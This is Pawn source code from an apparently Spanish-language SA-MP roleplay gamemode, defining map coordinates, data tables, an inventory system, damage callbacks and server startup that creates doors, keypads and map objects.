static const Float:PosCarcelesLSPD[][6] =
{
	{2531.04, -1285.61, 1031.65,2532.40, -1285.61, 1031.65},
	{2535.20, -1285.65, 1031.65,2536.58 , -1285.65, 1031.65},
	{2539.31, -1285.65, 1031.65,2540.73, -1285.65, 1031.65},
	{2543.47, -1285.65, 1031.65,2544.87, -1285.65, 1031.65},
	{2547.55, -1285.65, 1031.65,2548.97, -1285.65, 1031.65},
	{2551.67, -1285.65, 1031.65,2553.01, -1285.65, 1031.65},
	{2555.79, -1285.65, 1031.65,2557.01, -1285.65, 1031.65},
	{2531.03, -1301.75, 1031.65,2532.51, -1301.75, 1031.65},
	{2534.73, -1301.75, 1031.65,2536.05, -1301.75, 1031.65},
	{2538.77, -1301.75, 1031.65,2539.97, -1301.75, 1031.65},
	{2542.87, -1301.75, 1031.65,2544.35, -1301.75, 1031.65},
	{2547.05, -1301.75, 1031.65,2548.41, -1301.75, 1031.65},
	{2551.17, -1301.75, 1031.65,2552.45, -1301.75, 1031.65},
	{2555.31, -1301.75, 1031.65,2556.59, -1301.75, 1031.65},
	{2555.33, -1301.75, 1037.87,2554.03, -1301.75, 1037.87},
	{2551.21, -1301.75, 1037.87,2549.93, -1301.75, 1037.87},
	{2547.07, -1301.75, 1037.87,2545.65, -1301.75, 1037.87},
	{2542.99, -1301.75, 1037.87,2541.59, -1301.75, 1037.87},
	{2538.89, -1301.75, 1037.87,2537.41, -1301.75, 1037.87},
	{2534.73, -1301.75, 1037.87,2533.45, -1301.75, 1037.87},
	{2535.28, -1285.53, 1037.99,2536.58, -1285.53, 1037.99},
	{2539.32, -1285.55, 1037.99,2540.64, -1285.55, 1037.99},
	{2547.60, -1285.55, 1037.99,2548.82, -1285.55, 1037.99},
	{2551.76, -1285.55, 1037.99,2553.06, -1285.55, 1037.99},
	{2555.88, -1285.55, 1037.99,2556.98, -1285.55, 1037.99}

};

static const PosRepartidorBici[37][rPos] =
{
	{1784.8794,-1286.4650,13.1454},
	{1709.5210,-1343.7234,13.0589},
	{1518.9237,-1445.9404,13.051},
	{1294.7712,-1543.3961,13.0571},
	{1153.1699,-1566.7540,13.0564},
	{1032.6443,-1555.7172,13.0605},
	{1038.4423,-1332.6990,13.0589},
	{1001.9288,-1154.4996,23.3532},
	{1022.6967,-1135.4106,23.3352},
	{1087.3840,-1068.3732,27.9118},
	{1428.0126,-959.0988,35.8540},
	{1437.9546,-939.0643,35.5922},
	{1423.3790,-873.6474,49.2838},
	{1472.0377,-885.6097,56.3801},
	{1521.1304,-848.2230,65.4246},
	{1522.2830,-798.5494,73.2076},
	{1513.0347,-775.9583,79.6695},
	{1463.7498,-731.5829,92.9745},
	{1238.4674,-729.4493,95.1268},
	{1081.3834,-775.9934,107.6036},
	{920.9072,-669.8862,117.2162},
	{790.5565,-808.3723,65.3238},
	{915.0607,-833.7178,92.6228},
	{865.7886,-859.6664,76.9895},
	{833.7240,-866.7861,68.4361},
	{853.9235,-892.4321,64.6792},
	{480.1762,-1283.3325,15.1101},
	{192.5630,-1739.2463,3.7983},
	{396.0812,-1779.6624,5.0975},
	{703.9941,-1770.5037,13.0422},
	{912.0363,-1530.7986,13.0665},
	{1425.5543,-1559.8296,13.0495},
	{1993.7052,-1756.5781,12.8852},
	{2077.0566,-1732.2482,12.8888},
	{2077.2341,-1718.1078,12.8968},
	{2077.4238,-1703.0667,12.9025},
	{2031.3412,-1294.9836,20.4294}
};

static const Float:Camillas[][] =
{
	{2567.5659,1307.4405,865.8562,0.0000},
	{2567.6953,1304.3881,865.8462,3.2999},
	{2578.0747, 1278.7846,865.7965,3.6999},
	{2577.7451,1285.7523,865.7663,4.5999},
	{1183.5804,-1330.000000,13.056700000,90.0},
	{1183.5804,-1331.000000,13.056700000,90.0},
	{1183.5804,-1332.000000,13.056700000,90.0}
};

new
	InfoNegocio  		[MAX_NEGOCIOS]   		[nInfo],
	InfoCasa	 		[MAX_CASAS]      		[cInfo],
	InfoGarage   		[MAX_GARAGES]    		[gInfo],
	InfoInteriorCasa 	[MAX_INTERIORES_CASA] 	[iInfo],
	InfoFaccion  		[MAX_FACCIONES+1]		[fInfo],
	InfoCamion			[MAX_CAMIONES+1]		[camInfo],
	InfoFamilia  		[MAX_FAMILIAS]   		[famInfo],
	InfoJugador  		[MAX_PLAYERS]    		[InfoJ],
	InfoJugadorTemp     [MAX_PLAYERS]           [InfoJ],
	InfoVeh		 		[MAX_VEH_VENTA]  		[vInfo],
	InfoCuentaB  		[MAX_CUENTAS_BANCARIAS]	[bancInfo],
	Objeto		 		[MAX_OBJETOS]			[objInfo],
	InfoPorton_Ex		[MAX_PORTONES]			[InfoPorton_Ex2],
	InfoObjeto_T		[MAX_OBJETOS_T]			[ObjetoTInfo],
	InfoTV		 		[MAX_TVS]				[E_INFOTV],
	InfoGZ	 	 		[MAX_GZS]				[E_GZ],
	InfoInterior		[MAX_INTERIORES]		[E_INTINFO],
	InfoCamilla			[sizeof(Camillas)+1]	[E_CAMILLA],
	InfoContrato		[20]					[E_CONTRATOH],
	InfoRango			[MAX_FACCIONES]			[MAX_RANGOS_FAC][MAX_RANGO_LEN],
	InfoLider			[MAX_FACCIONES]			[MAX_RANGO_LEN],
	KeyPadInfo			[MAX_KEYPAD]			[E_KEYPAD],
	InfoMineral			[sizeof(PosMinerales)+1][E_MINERAL];


new
	VehVentaID[MAX_VEHICLES],
	vMods[MAX_VEH_VENTA][MAX_VEH_MODS],
	Veh[MAX_VEHICLES][Vehi];

new
	Total_Casas_Creadas,
	Total_Vehiculos_Creados,
	Total_Interiores_Creados,
	Total_Negocios_Creados,
	Total_Familias_Creadas,
	Total_Garages_Creados,
	Total_Cuentas_Bancarias,
	Total_Objetos_Creados;

// ---====[ Puertas y KeyControl ]====---- //

new
	PLSPD1,
	PLSPD2,
	PALSPD1,
	PALSPD2,
	PCLSPD,
	BCASINO1,
	BCASINO2,
	PEJERCITO1,
	PEJERCITO2,
	PFUERZAAEREA,
	BLSMD[2],
	PLSMD[2],
	PLSTV[2],
	BGROTTI,
	PGOB[2],
	BGOB,
	BDEPTOSG,
	PMECAS[2],
	PCELDAS[3],
	PHITMAN[2],
	PHLSMD,
	PDLSMD;

//KeyPads
new
	KP_AscensorLSPD,
	KP_HabitacionLSMD[2],
	KP_DirectorLSMD[2],
	KP_EntradaCarceles[2],
	KP_PortonEjercito[2],
	KP_PortonEjercito2[2],
	KP_Mecas[2],
	KP_Mecas2[2];

stock Float: GetPointZPos(const Float: fX, const Float: fY, &Float: fZ = 0.0) // by: RyDeR's
{
        if(!((-3000.0 < fX < 3000.0) && (-3000.0 < fY < 3000.0)))
		{
  			return 0.0;
		}
        static
        	File: s_hMap
        ;

        if(!s_hMap)
        {
        	s_hMap = fopen("SAfull.hmap", io_read);

			if(!s_hMap)
			{
  				return 0.0;
			}
        }
        new
        	afZ[1]
        ;

        fseek(s_hMap, ((6000 * (-floatround(fY, floatround_tozero) + 3000) + (floatround(fX, floatround_tozero) + 3000)) << 1));
        fblockread(s_hMap, afZ);

        return (fZ = ((afZ[0] >>> 16) * 0.01));
}

stock SPEC_SetPlayerVirtualWorld(playerid, vw)
{
	SetPlayerVirtualWorld(playerid, vw);
	if(Specteado_Por[playerid] != INVALID_PLAYER_ID)
	{
	    SetPlayerVirtualWorld(Specteado_Por[playerid], vw);
	}

	if(CasaActual[playerid] != INVALID_HOUSE_ID)
	{
		Loop(m, MAX_MUEBLES_CASA, 0)
	    {
	        if(OBJ_Mueble[playerid][m] != INVALID_OBJECT_ID)
	        {
				//MensajeF(playerid, -1, "PlayerObject(%d) Destruido!", OBJ_Mueble[playerid][m]);
				DestroyPlayerObject(playerid, OBJ_Mueble[playerid][m]);
	            OBJ_Mueble[playerid][m] = INVALID_OBJECT_ID;
			}
		}
	}

	if(100 <= vw < 100+MAX_CASAS) //Cargar Muebles
	{
	    new
	        house = vw-100;

		Loop(m, MAX_MUEBLES_CASA, 0)
		{
			if(InfoCasa[house][cObjPosX][m] != 0 && InfoCasa[house][cObjPosY][m] != 0 && InfoCasa[house][cObjPosX][m] != 0)
			{
				OBJ_Mueble[playerid][m] = CreatePlayerObject(playerid,  InfoCasa[house][cObjModel][m],
    																	InfoCasa[house][cObjPosX][m],
    																	InfoCasa[house][cObjPosY][m],
    																	InfoCasa[house][cObjPosZ][m],
    																	InfoCasa[house][cObjRotX][m],
    																	InfoCasa[house][cObjRotY][m],
    																	InfoCasa[house][cObjRotZ][m]);
				//MensajeF(playerid, -1, "PlayerObject(%d) creado!", OBJ_Mueble[playerid][m]);
			}
		}
		
		CasaActual[playerid] = house;
	}
	else
	{
	    CasaActual[playerid] = INVALID_HOUSE_ID;
	}
	return 1;
}
#if defined _ALS_SetPlayerVirtualWorld
	#undef SetPlayerVirtualWorld
#else
	#define _ALS_SetPlayerVirtualWorld
#endif

#define SetPlayerVirtualWorld SPEC_SetPlayerVirtualWorld

stock udb_hash(buf[]) // by: DracoBlue
{
    new length=strlen(buf);
    new s1 = 1;
    new s2 = 0;
    new n;
    for (n=0; n<length; n++)
    {
       s1 = (s1 + buf[n]) % 65521;
       s2 = (s2 + s1)     % 65521;
    }
    return (s2 << 16) + s1;
}

stock GetZoneNameAtCoord(Float:x, Float:y, zone[], len = sizeof(zone))
{
 	for (new i = 0; i != sizeof (ZoneNames); ++i)
 	{
		if (x >= ZoneNames[i][zoneArea][0] && x <= ZoneNames[i][zoneArea][3] && y >= ZoneNames[i][zoneArea][1] && y <= ZoneNames[i][zoneArea][4])
		{
		    strunpack (zone, ZoneNames[i][zoneName], len);
			return i;
		}
	}
	return -1;
}

// ====== SISTEMA DE INVENTARIO =========

/* ---------------------------------------------
native AddToInv(playerid, object, slot)
native GetFreeSlotToObject(playerid)
native GetObjectName(object, name[], dest = sizeof (name))
native HaveFreeSlotForObject(playerid)
native GetPlayerObject(playerid)
native HaveObject(playerid, model)
native GetObjectIndexFromModel(object)
native GetObjectFromIndex(playerid, slot)
native SetPlayerObject(playerid, object = INVALID_OBJECT_ID, slot = -1)
native RemovePlayerObject(playerid, object = INVALID_OBJECT_ID, slot = -1)
native GetPlayerObjectIndexFromModel(playerid, object)
// -------------------------------------------- */

stock AddToInv(playerid, object, slot=-1)
{
	if(slot == -1)// -1 = find slot.
	    slot = GetFreeSlotToObject(playerid);

	if(0 <= slot < MAX_OBJS)
	{
		InfoJugador[playerid][jObjeto][slot] = object;
		ActualizarObjetoInv(playerid, slot);
		return 1;
	}

	return 0;
}

stock ActualizarObjetoInv(playerid, slot)
{
	new
	    str[15],
		INI:Arch = INI_Open(U_Usuario(playerid));

	INI_SetTag(Arch, "data");
	
	A_Format(str, "Objeto%d", slot);
	INI_WriteInt(Arch,str,InfoJugador[playerid][jObjeto][slot]);
	INI_Close(Arch);
	return 1;
}

stock GetObjectName(object, name[], dest = sizeof (name))
	return strunpack (name, ObjectInfo[GetObjectIndexFromModel(object)][objName], dest);

stock PlayerNeedObject(playerid, object)
{
	if(GetPlayerObject(playerid) == object && IsPlayerAttachedObjectSlotUsed(playerid, SLOT_OBJECTS)) return 1;

	new
	    String[75],
		Name[30];

	GetObjectName(object, Name);

	A_Format(String, "¡Necesitas un/a ~g~~h~%s~w~!", Name);
	Error(playerid, String);
	return 0;
}

#define NeedObject(%0)<%1>   if(!PlayerNeedObject(%0,%1)) return 1
#define AddObjectInv(%0)<%1> if(!AddToInv(%0,%1)) return Error(%0,"¡No se encontró más espacio en el inventario!")

stock GetFreeSlotToObject(playerid)
{
	for(new i; i < MAX_OBJS; i++)
		if(InfoJugador[playerid][jObjeto][i] == 0)
		    return i;

	return -1;
}

stock HaveFreeSlotForObject(playerid)
	return (GetFreeSlotToObject(playerid) != -1);

stock GetPlayerObject(playerid)
	return CurrentObject[playerid];

stock HaveObject(playerid, model)
{
	for(new i; i < MAX_OBJS; i++)
		if(InfoJugador[playerid][jObjeto][i] == model)
		    return 1;

	return 0;
}

stock GetObjectIndexFromModel(object)
{
	for(new i; i != sizeof (ObjectInfo); i++)
		if(ObjectInfo[i][objModel] == object)
		    return i;

	return -1;
}

stock GetObjectFromIndex(playerid, slot)
	return InfoJugador[playerid][jObjeto][slot];

stock GetPlayerObjectIndexFromModel(playerid, object)
{
	for(new i; i < MAX_OBJS; i++)
		if(InfoJugador[playerid][jObjeto][i] == object)
		    return i;

	return -1;
}


stock SetPlayerObject(playerid, object = INVALID_OBJECT_ID, slot = -1)
{
	if(numargs() == 1) print("[ERROR]: Falta usar parámetros en SetPlayerObject.");

	if(slot == -1 && object != INVALID_OBJECT_ID)
	{
		new
	    	i = GetObjectIndexFromModel(object);

		SetPlayerAttachedObject(playerid, SLOT_OBJECTS, object, 5,
				ObjectInfo[i][objPos][0], ObjectInfo[i][objPos][1], ObjectInfo[i][objPos][2],
				ObjectInfo[i][objRot][0], ObjectInfo[i][objRot][1], ObjectInfo[i][objRot][2],
				ObjectInfo[i][objEsc][0], ObjectInfo[i][objEsc][1], ObjectInfo[i][objEsc][2]);

		CurrentObject[playerid] = object;
		return 1;
	}
	if(slot != -1 && object == INVALID_OBJECT_ID)
	{
		new
	    	i = slot,
			model = GetObjectFromIndex(playerid, slot);

		SetPlayerAttachedObject(playerid, SLOT_OBJECTS, model, 5,
				ObjectInfo[i][objPos][0], ObjectInfo[i][objPos][1], ObjectInfo[i][objPos][2],
				ObjectInfo[i][objRot][0], ObjectInfo[i][objRot][1], ObjectInfo[i][objRot][2],
				ObjectInfo[i][objEsc][0], ObjectInfo[i][objEsc][1], ObjectInfo[i][objEsc][2]);

		CurrentObject[playerid] = model;
		return 1;
	}
	return 0;
}

stock RemovePlayerObject(playerid, object = INVALID_OBJECT_ID, slot = -1)
{
	if(numargs() == 1) print("[ERROR]: Falta usar parámetros en RemovePlayerObject.");

	if(slot == -1 && object != INVALID_OBJECT_ID)
	{
	    if(!HaveObject(playerid, object)) return 0;
		if(GetPlayerObject(playerid) == object)
		{
		    CurrentObject[playerid] = 0;
		    RemovePlayerAttachedObject(playerid, SLOT_OBJECTS);
		}
		new
		    slot_0 = GetPlayerObjectIndexFromModel(playerid, object);

		InfoJugador[playerid][jObjeto][slot_0] = 0;
		ActualizarObjetoInv(playerid, slot_0);
		return 1;
	}
	if(slot != -1 && object == INVALID_OBJECT_ID)
	{
		new
			model = GetObjectFromIndex(playerid, slot);

	    if(!HaveObject(playerid, model)) return 0;
		if(GetPlayerObject(playerid) == model)
		{
		    CurrentObject[playerid] = 0;
		    RemovePlayerAttachedObject(playerid, SLOT_OBJECTS);
		}
		InfoJugador[playerid][jObjeto][slot] = 0;
		ActualizarObjetoInv(playerid, slot);
		return 1;
	}
	return 0;
}

stock ShowInv(playerid, target = INVALID_PLAYER_ID)
{
	if(target != INVALID_PLAYER_ID)
	{
		SetPVarInt(target, "INT_AJENO", true);
	}
	else
	{
		target = playerid;
	}

	new
		Objects[MAX_OBJS],
		Amount,
		Float:Object_Rotx[MAX_OBJS],
		Float:Object_Roty[MAX_OBJS],
		Float:Object_Rotz[MAX_OBJS],
		Float:Object_Zoom[MAX_OBJS];

	for(new i; i < MAX_OBJS; i++)
	{
	    if(InfoJugador[playerid][jObjeto][i])
	    {
	        Objects[Amount] = InfoJugador[playerid][jObjeto][i];
	        if(InfoJugador[playerid][jObjeto][i] == OBJ_CEL || InfoJugador[playerid][jObjeto][i] == OBJ_GPS)
	        {
	            Object_Rotx[Amount] = -90.0;
	            Object_Rotz[Amount] = 180.0;
			}
			if(InfoJugador[playerid][jObjeto][i] == OBJ_DINAMITA)
			{
	            Object_Rotz[Amount] = 170.0;
			}
			Object_Zoom[Amount] = 1.0;
	        Amount++;
		}
	}
	if(!Amount) return Error(playerid, "¡No tienes nada en el inventario!");
	ShowModelSelectionMenuEx(target, Objects, Amount, "~w~Inventario", LIST_INV, Object_Rotx, Object_Roty, Object_Rotz, Object_Zoom, 0x3E327796, .tdSelectionColor=0x00000099);
	return 1;
}

stock IsValidObject2(object)
{
	for(new i; i != sizeof (ObjectInfo); i++)
		if(ObjectInfo[i][objModel] == object)
		    return true;

	return false;
}
// ---------------------

stock GetServerLatency()
{
	new
		Ping,
		bool:HavePlayers,
	 	CountPlayers;

	#if defined foreach
	foreach(new i : Player)
	#else
	for(new i; i < GetMaxPlayers(); ++i) if(IsPlayerConnected(i) && !IsPlayerNPC(i))
	#endif
	{
		#if !defined foreach
		CountPlayers++;
		#endif
		Ping += GetPlayerPing(i);
		if(!HavePlayers) HavePlayers = true;
	}
	if(!HavePlayers) return -1;
	#if defined foreach
	CountPlayers = Iter_Count(Player);
	#endif
	return (HavePlayers) ? (floatround( Ping / CountPlayers )) : (-1);

}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid)
{
	if(Bit_Get(AnimsLocked, damagedid))
	{
	    return 1;
	}

	switch(weaponid)
 	{
		case 22..34:
		{
			ApplyAnimation(damagedid, "PED", "DAM_ARML_FRMFT", 4.0, 0, 1, 1, 0, 0);
		}
	}
//	MensajeTodosF(-1, "OnPlayerGiveDamage::"#CROJO"(%d, %d, %f, %d)",playerid, damagedid, amount, weaponid);
	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid)
{
//	MensajeTodosF(-1, "OnPlayerTakeDamage::"#CROJO"(%d, %d, %f, %d)",playerid, damagedid, amount, weaponid);

	new
	    //Float: vida_p = GetPVarInt(playerid, "VIDA_PERDIDA"),
	    Float: vida;

	GetPlayerHealth(playerid, vida);

	SetGreyLifePos(playerid, vida-amount, vida);
	SetPVarFloat(playerid, "VIDA_PERDIDA", vida );

  	if(issuerid != INVALID_PLAYER_ID)
  	{
  	    if(weaponid == WEAP_TAZER && GetPVarInt(issuerid,"TAZER_DK"))
  	    {
   	        if(IsPlayerInAnyVehicle(playerid))
			   RemovePlayerFromVehicle(playerid);

			ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 1, 0);
			SetPVarInt(playerid,"TAZEADO",1);
			TextoJugador(playerid,"~r~electrocutado~n~~n~~w~espera que te quiten los cables",5000,3);
			
   			new
			   Str[60];
			   
   			A_Format(Str,"dispara con su arma tazer a %s",NombreJugador(playerid));
   			AutoRol(issuerid,Str);
			Bit_Set(AnimsLocked, playerid, true);
		}
		if(InfoJugador[issuerid][jHoras] < 2)
		{
		    CongelarEx(issuerid, 10);
			Error(issuerid, "¡No puedes herir en las primeras dos horas de juego!");
		}
	}
	return 1;
}

// ---====[ Main ]====---- //

main()
{
	INI_Load("Datos_generales.ini");

	print (" ");
	print ("\t==============================================================");
	print ("\t|                                                            |");
	print ("\t|    Gamemode Optimus RolePlay [2013] Versión: v2-final      |");
	print ("\t|                                                            |");
	print ("\t|    » Programado por Spell <leandro.barbero@hotmail.com>    |");
	print ("\t|                                                            |");
	print ("\t| Copyright 2012-2016 - Todos los derechos reservados        |");
	print ("\t|                                                            |");
	print ("\t==============================================================");
	print (" ");

	printf("*- Gamemode fue cargado en %d milisegundos.\n\n", (GetTickCount() - tCount) );

	SetTimer("OcultarNPCS", 10000, false);
	return 1;
}

// No hay forma de ocultarlos, no entiendo..
CALLBACK: OcultarNPCS()
{
	for(new i = 300; i < MAX_PLAYERS; i++) SetPlayerColor(i, 0x00000000);
	for(new i = 300; i < MAX_PLAYERS; i++) SetPlayerColor(i, 0x00000000);
	for(new i = 300; i < MAX_PLAYERS; i++) SetPlayerColor(i, 0x00000000);
	return 1;
}

public OnGameModeInit()
{
	static
		bool: Var;

	if(!Var)
	{
	    _OnGameModeInit();
	    Var = true;
	}
	return 1;
}

_OnGameModeInit()
{
	tCount = GetTickCount();

	Loop(i,MAX_PLAYERS,0)
	{
	    Loop(t,MAX_TIMERS,0)
	    {
			Timer_Jugador[i][t] = INVALID_TIMER_ID;
		}
	}

	Loop(i,MAX_PLAYERS,0)
	{
	    Loop(t,MAX_PCP,0)
	    {
			Checkpoint_Jugador[i][t] = PlayerCP:INVALID_PCP_ID;
		}
	}

	AntiDeAMX();

	// ---====[ Areas ]====---- //
	zCamionerosLVL1 = CreateDynamicRectangle(2420.5486, -2062.4370, 2704.5022, -2145.6912);
	zCosechadorLVL1 = CreateDynamicRectangle(-153.3136, -1297.8480, -482.0711, -1605.4917);

	// ---====[ KeyPads ]====---- //
	KP_AscensorLSPD = CreateKeyPad(252.9803, 107.7855, 1003.6687, -90.7);

	KP_HabitacionLSMD[0] = CreateKeyPad(2549.3005, 1264.6318, 866.8463, 175.4);// Entrar
	KP_HabitacionLSMD[1] = CreateKeyPad(2549.3193, 1264.5052, 866.8463, -3.5); //Salir

	KP_DirectorLSMD[0] = CreateKeyPad(2543.12256, 1268.99109, 866.8463, 82.14000);
	KP_DirectorLSMD[1] = CreateKeyPad(2542.99512, 1269.00635, 866.8463, -94.86000);

	KP_EntradaCarceles[0] = CreateKeyPad(2529.0087, -1295.7281, 1031.8918, -91.3); //Entrada
	KP_EntradaCarceles[1] = CreateKeyPad(2529.486,  -1295.809,  1031.8918, 90.0); //Salida

	KP_PortonEjercito[0] = CreateKeyPad(2720.4741, -2410.6699, 14.1028, 90); //Salida
	KP_PortonEjercito[1] = CreateKeyPad(2719.9865, -2409.9416, 13.9309, -90.6); //entrada
	
	KP_PortonEjercito2[0] = CreateKeyPad(2720.4697, -2498.7429, 14.1340, 90.1); //Salida
	KP_PortonEjercito2[1] = CreateKeyPad(2719.9812, -2499.3322, 13.9526, -90.8); //entrada
	
	KP_Mecas[0] = CreateKeyPad(1730.9257, -2077.2697, 14.1156, 179.4); //Entrada
	KP_Mecas[1] = CreateKeyPad(1728.9257, -2077.2697, 14.1156, 179.4); //Salida
	
	KP_Mecas2[0] = CreateKeyPad(1813.0397, -2066.8581, 13.9534, 89.5); //Entrada
	KP_Mecas2[1] = CreateKeyPad(1812.4819, -2066.7519, 14.0240, -91.0); //Salida
	
	// ---====[ Puertas ]====---- //

	PLSPD1 = CreateDynamicObject(989,CPLSPDC ,0.00000000,0.00000000,196.49609375); //plspdcerrada2
	PLSPD2 = CreateDynamicObject(989,CPLSPDC2,0.00000000,0.00000000,196.49597168); //plspdcerrada

	PALSPD1 = CreateDynamicObject(3051,253.10000610,109.69999695,1003.59997559,0.00000000,0.00000000,46.00000000); //acensor cerrado 2
	PALSPD2 = CreateDynamicObject(3051,253.09960938,108.50000000,1003.59997559,0.00000000,0.00000000,45.99975586); //ascensor cerrado 1
	PCLSPD  = CreateDynamicObject(1495,239.60000610,118.09999847,1002.20001221,0.00000000,0.00000000,270.00000000); //puerta lspd cerrada

	BCASINO1 = CreateDynamicObject(980,1213.69995117,-1841.90002441,15.19999981,0.00000000,0.00000000,180.00000000); //puerta estacionamiento caligula
	BCASINO2 = CreateDynamicObject(980,1269.40002441,-1842.69995117,15.19999981,0.00000000,0.00000000,179.99450684); //puerta estacionamiento caligula 2

	PEJERCITO1 = CreateDynamicObject(975,2720.30004883,-2405.39990234,14.19999981,0.00000000,0.00000000,270.00000000); //puerta 1 cerrada
	PEJERCITO2 = CreateDynamicObject(975,2720.30004883,-2504.00000000,14.19999981,0.00000000,0.00000000,270.00000000); //puerta 2 cerrada

	PFUERZAAEREA = CreateDynamicObject(980,482.00000000,-2312.00000000,4.40000010,0.00000000,0.00000000,0.00000000); //Fuerza aerea

	BLSMD[0] = CreateDynamicObject(968,1209.90002441,-1291.69995117,13.19999981,0.00000000,270.00000000,0.00000000); //barrera cerrada 1
	BLSMD[1] = CreateDynamicObject(968,1210.09997559,-1385.19995117,13.00000000,0.00000000,270.00000000,0.00000000); //barrera cerrada 2

	PLSMD[0] = CreateDynamicObject(988,1141.40002441,-1292.09997559,13.69999981,0.00000000,0.00000000,180.00000000); //puerta 1cerrada
	PLSMD[1] = CreateDynamicObject(988,1135.90002441,-1292.09997559,13.69999981,0.00000000,0.00000000,179.99450684); //puerta2cerrada

	PLSTV[0] = CreateDynamicObject(971,778.00000000,-1384.90002441,13.10000038,0.00000000,0.00000000,0.00000000); //puerta cerrada 1
	PLSTV[1] = CreateDynamicObject(971,777.90002441,-1330.30004883,13.00000000,0.00000000,0.00000000,0.00000000); //puerta cerrada 2

	BGROTTI = CreateDynamicObject_e(2920,558.90002441,-1255.69995117,17.10000038,90.00000000,0.00000000,300.00000000); //barreracerrada

	PGOB[0] = CreateDynamicObject(980,1264.59997559,-2048.30004883,60.90000153,0.00000000,0.00000000,180.00000000); //puerta1cerrada
	PGOB[1] = CreateDynamicObject(980,1211.09997559,-2037.40002441,70.80000305,0.00000000,0.00000000,270.00000000); //puerta2cerrada

	BGOB = CreateDynamicObject(968,1430.90002441,-1883.19995117,13.30000019,0.00000000,270.00000000,0.00000000); //barreracerrada

	BDEPTOSG = CreateDynamicObject(968,2188.96411133,-1776.94152832,13.17317390,0.00000000,270,0.00000000); //object(barrierturn) (1)

	PMECAS[0] = CreateDynamicObject(971,1729.770385,-2072.675781,16.081611,0.00000000,0.00000000,270.48889160); //puertadepositocerrada(3)
	PMECAS[1] = CreateDynamicObject(8229,1812.724487, -2066.374511,15.228534,0.00000000,0.00000000,270.00000000); //puertaprincipalcerrada(1)

	PCELDAS[0] = CreateDynamicObject(1495, 2565.63, -1300.40, 1030.42,   0.00, 0.00, -89.82);
	PCELDAS[1] = CreateDynamicObject(1495, 2565.64, -1303.40, 1030.42,   0.00, 0.00, -270.54);
	PCELDAS[2] = CreateDynamicObject(971, 2529.24, -1290.99, 1030.11,   0.00, 0.00, 90.12);

	PHITMAN[0] = CreateDynamicObject(16773,282.7000122,-1542.4000244,25.3999996,0.0000000,0.0000000,326.0000000); //puertecerrada1
	PHITMAN[1] = CreateDynamicObject(16773,321.2000122,-1488.3000488,25.3999996,0.0000000,0.0000000,325.9973145); //puertacerrada2

	PHLSMD = CreateDynamicObject(1569, 2547.5451, 1264.6682, 865.2559, 0.0, 0.0, -3.5);
	PDLSMD = CreateDynamicObject(1569, 2543.2097, 1270.8, 865.2559, 0, 0, -92.5);

	//CÁMARAS DE SEGURIDAD - LSPD
	Loop(i,MAX_CAMARAS,0)
	{
		OBJ_Camara[i] = CreateObject(2921,InfoCamara[i][CamPosX],InfoCamara[i][CamPosY],InfoCamara[i][CamPosZ],InfoCamara[i][CamRotX],InfoCamara[i][CamRotY],InfoCamara[i][CamRotZ]);
	}

	//CÁRCELES
	Loop(i,sizeof PosCarcelesLSPD,0)
	{
	    OBJ_Carcel[i] = CreateDynamicObject(19302, PosCarcelesLSPD[i][0],PosCarcelesLSPD[i][1],PosCarcelesLSPD[i][2],0.0,0.0,0.0);
	}

	Loop(i, sizeof EstacionServicio, 0)
	{
	    CreateDynamic3DTextLabel(""#CVERDE"Estación de servicio\n\n"#CBLANCO"Use "#CINFO"/cargar combustible [opcional: litros]"#CBLANCO" para comenzar a llenar el tanque.\nUse "#CINFO"/comprar bidon ($40)"#CBLANCO" para comprar un bidón con 10 litros de combustible.", C_BLANCO, EstacionServicio[i][0], EstacionServicio[i][1], EstacionServicio[i][2], 10);
	}

	// --==] Objetos estáticos [==-- //
	#define CreateObject CreateDynamicObject
	//          ATAJOS CAMIONEROS       //
	CreateObject(978, 2408.51, -2135.93, 13.35,   0.00, 0.00, 270.20);
	CreateObject(978, 2408.53, -2125.21, 13.35,   0.00, 0.00, 270.20);
	CreateObject(978, 2408.44, -2114.63, 13.35,   0.00, 0.00, 270.20);
	CreateObject(978, 2408.38, -2104.32, 13.35,   0.00, 0.00, 270.20);
	CreateObject(978, 2408.31, -2093.94, 13.35,   0.00, 0.00, 270.20);
	CreateObject(978, 2408.23, -2083.38, 13.35,   0.00, 0.00, 270.20);
	CreateObject(978, 2408.21, -2073.33, 13.35,   0.00, 0.00, 270.20);
	CreateObject(978, 2408.16, -2063.02, 13.35,   0.00, 0.00, 270.20);
	CreateObject(978, 2413.84, -2141.88, 13.35,   0.00, 0.00, 359.36);
	CreateObject(978, 2421.29, -2137.77, 13.35,   0.00, 0.00, 419.42);
	CreateObject(3722, 2197.81, -2014.58, 16.87,   3.14, 0.00, 45.12);
	CreateObject(3722, 2183.70, -1979.14, 16.87,   3.14, 0.00, -86.40);

	//          HOSPITAL NUEVO          //
	CreateObject(14795, 1381.44922, -21.80108, 1433.01257,   356.85840, 0.00000, 3.14159);
	CreateObject(8411, 2575.65308, 1317.21143, 800.38440,   0.00000, 0.00000, 0.00000);
	CreateObject(8411, 2575.60181, 1291.92407, 800.38440,   0.00000, 0.00000, 0.00000);
	CreateObject(8411, 2575.61548, 1266.72949, 800.38440,   0.00000, 0.00000, 0.00000);
	CreateObject(8411, 2513.19727, 1266.90857, 800.38440,   0.00000, 0.00000, 0.00000);
	CreateObject(8411, 2513.22217, 1292.30420, 800.38440,   0.00000, 0.00000, 0.00000);
	CreateObject(8411, 2513.22217, 1317.18420, 800.38440,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2606.27539, 1316.82947, 865.69012,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2606.27539, 1290.72949, 865.69012,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2606.27539, 1264.66956, 865.69012,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2593.33472, 1329.72937, 865.69012,   0.00000, 0.00000, -90.00006);
	CreateObject(9339, 2567.23633, 1329.72021, 865.71008,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2541.20874, 1329.74182, 865.73010,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2515.09521, 1329.73376, 865.69012,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2489.01514, 1329.73376, 865.69012,   0.00000, 0.00000, -90.00010);
	CreateObject(9339, 2481.65503, 1316.71509, 865.69012,   0.00000, 0.00000, 0.00000);
	CreateObject(9339, 2481.65503, 1290.62280, 865.69012,   0.00000, 0.00000, 0.00000);
